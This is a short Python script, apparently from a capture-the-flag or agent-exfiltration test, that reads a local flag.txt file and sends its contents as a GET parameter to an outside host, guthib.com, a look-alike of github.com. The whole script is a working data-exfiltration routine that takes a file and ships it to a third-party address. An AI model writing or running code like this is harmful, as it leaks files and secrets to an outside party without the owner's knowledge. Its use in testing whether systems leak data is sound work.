import requests
import os

def read_flag(file_path):
    """Read the content of the flag.txt file."""
    try:
        with open(file_path, 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        print(f"Error: {file_path} not found.")
        return None
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return None

def send_ping_with_payload(url, payload):
    """Send a GET request with the payload as a parameter."""
    try:
        response = requests.get(url, params={"payload": payload})
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Text: {response.text}")
    except requests.RequestException as e:
        print(f"Error sending request: {e}")

if __name__ == "__main__":
    FLAG_FILE = "flag.txt"
    TARGET_URL = "https://guthib.com/"

    # Read the flag
    flag_payload = read_flag(FLAG_FILE)

    if flag_payload:
        # Send ping with the payload
        send_ping_with_payload(TARGET_URL, flag_payload)
    else:
        print("No valid payload to send.")
